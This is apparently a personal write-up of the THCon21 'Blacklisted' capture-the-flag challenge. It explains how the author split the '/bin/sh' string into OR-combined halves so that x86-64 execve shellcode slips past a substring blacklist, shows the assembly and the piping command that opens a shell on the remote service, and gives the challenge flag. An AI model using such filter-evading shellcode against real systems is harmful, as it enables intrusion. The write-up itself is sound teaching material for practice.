---
layout: writeup
title: "Blacklisted"
categories: thcon
order: 3
flag: "THCon21{w3ll_s0_y0u_sp34K_P4r53l70ngu3??}"
challenge_type: "intro"
---

**Category:** Intro /
**Points:** 49 (dynamic) / 
**Solves:** 42

**Description:**


>Don't say the magic word !
>
>    - nc remote1.thcon.party 10907
>    - nc remote2.thcon.party 10907
>

**Files :**
>
>    - [blacklisted](https://test.com)

**Creator(s) :** Voydstack (Discord : voydstack#6035)

## Details

I spent more time on this challenge that I would like to admit, but, eh, it was my first time using a shellcode. (Estimated Time : 3hours). More details on my failures in the following writeup.

It was a great challenge overall, I learnt a great deal about shellcodes and architectures.

## First contact

<!--As we are given remote addresses, the challenge here seems to exploit the remote binary to print the flag or get a remote shell.-->

We can execute the given binary to get a first feel of the challenge:

```
$ ./blacklisted
Please feed me (64 bytes max): AA
Erreur de segmentation
```

So this challenge consisted in dropping a remote shellcode that gets executed, as the input the program asks for.

But if we try using some basic shellcodes, the program tells you that you used a blacklisted string and do not execute:

```
$ ./blacklisted < shellcode.bin
Please feed me (64 bytes max): 
[-] You used a forbidden string: '/bin/'.
```

After a quick RE, we find a function rightfully called `check_blacklist` that searches in your input the presence of the following strings:
- "/bin/"
- "/tmp/"
- "flag.txt"
- "sh"

## Crafting a shellcode

So after scratching my head on how to approach this challenge without relying on obfuscated shellcodes (in order to practice a bit and to larn something out of this challenge), I decided to modify a normal shellcode that would execute `execve("/bin/sh")` not to contain any reference to any blacklisted substring.

The solution I came up with was to split the string `"/bin/sh"` in half-bytes (half to avoid having any null-bytes in my string) and then reassembling them using an OR operation.

	 20 60 60 60 20 70 60
	+0f 02 09 0e 0f 03 08
	---------------------
	"/  b  i  n  /  s  h"

Thanks to this method, I would be able to get around the blacklist, because neither part contained any prohibited word.

<u><em>First mistake</em></u> : I thought x32 would be compatible with x64. I spent A LOT of time using a x32 payload before realising it wouldn't work and that I should use a x86-64 one. But now I know that if an x64 OS is able to run x32 programms, the shellcode HAS to correspond to the architecture of the program being executed. Dumb lesson learnt.

I then used the following x86-64 shellcode : http://shell-storm.org/shellcode/files/shellcode-77.php, but I decided to trim the first and last syscall (corresponding to setuid) as I deemed them unecessary for this challenge and to be sure they wouldn't cause any issue. I ended up with the most basic of shellcodes:

```
xorq   %rdx, %rdx 
movq   $0x68732f6e69622fff,%rbx 
shr    $0x8, %rbx 
push   %rbx 
movq   %rsp,%rdi 
xorq   %rax,%rax 
pushq  %rax 
pushq  %rdi 
movq   %rsp,%rsi 
mov    $0x3b,%al 
syscall 
```

I modified the first movq instruction to do my bidding, by adding a second movq to the rax register as rax is later nullified (by xor-ing it against itself) so I was sure it wouldn't interfere, which gave me the following x86-64 assembly code:

```
xorq   %rdx, %rdx 
movq   %0x60702060606020f0, %rbx
movq   %0x08030f0e09020f0f, %rax
orq    %rax, %rbx
shr    $0x8, %rbx 
...
```

## Exploitation

So I ended up with a 0x36 bytes shellcode, which is within the 0x40 bytes limit of the accepted input. 

Using a [neat website](https://defuse.ca/online-x86-assembler.htm) to assemble my code, I decided to run the new shellcode against my program:
```
$ blacklisted < shellcode.bin
Please feed me (64 bytes max): 
$ echo $?
0
```

It bypassed the blacklist and returned with a 0 exit code, meaning that `execve` actually worked, and then returned as there was no further input.

Great, now I know the payload must have worked I just need to make it not close because of end of input. I remember the trick was to use `cat`.

<u><em>Second mistake</em></u> : I trusted my gut feelings without properly thinking and ran the following command:

	(./blacklisted; cat -) < shellcode.bin

Let me tell you : it doesn't work as intended, but my stupid brain thought it was the right expression.

And as the command didn't grant me any shell, I fell into a rabbit hole and thought I just interact with the shell after obtaining it and should explore other ideas.

One such idea was to do a `/bin/cat` on the `flag.txt` file, but it got complicated quite fast and I came back to my first command, only for me to now realise the issue. 

The correct command was:
	
	(cat shellcode.bin; cat -) | ./blacklisted

And that worked perfectly with my modified shellcode. I then ran it against the remote version and popped a shell. I could then cat the flag and get my delicious points.